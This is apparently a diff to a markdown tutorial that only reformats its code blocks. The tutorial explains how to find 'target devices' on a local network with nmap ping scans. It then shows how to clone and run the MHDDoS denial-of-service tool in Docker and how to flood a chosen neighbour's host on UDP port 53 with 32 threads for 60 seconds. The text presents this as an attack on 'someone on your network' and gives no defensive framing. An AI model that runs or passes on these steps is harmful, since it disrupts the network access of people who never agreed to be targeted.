@@ -21,24 +21,37 @@ we need to find the local address of the target device(s).
 
 Before you can target specific devices, you'll need to identify them on your local network. Here's how to use nmap to scan for devices:
 
-```nmap -sn 192.168.1.0/24```
+```bash
+nmap -sn 192.168.1.0/24
+```
 
 This command will scan the entire subnet and identify all active devices. You can also use:
 
-```nmap -sP 192.168.1.0/24```
+```bash
+nmap -sP 192.168.1.0/24
+```
 
 To get more detailed information about each device, including their MAC addresses and open ports. Once you've identified the target device, you can proceed with the DDoS attack.
 
 ### Using MHDDoS for Network Disruption
 
 First, clone the repository:
-```git clone https://github.com/MatrixTM/MHDDoS```
+
+```bash
+git clone https://github.com/MatrixTM/MHDDoS
+```
 
 I recommend using the provided Docker image:
-```docker compose run -it --entrypoint /bin/bash mhddos```
+
+```bash
+docker compose run -it --entrypoint /bin/bash mhddos
+```
 
 Then you can target someone on your network (i.e. `192.168.1.192:53`) by running this command inside the Docker container:
-```python start.py udp 192.168.1.192:53 32 60```
+
+```bash
+python start.py udp 192.168.1.192:53 32 60
+```
 
 This command will target `192.168.1.192` on port `53` (DNS) using UDP protocol with 32 threads for 60 seconds.
 
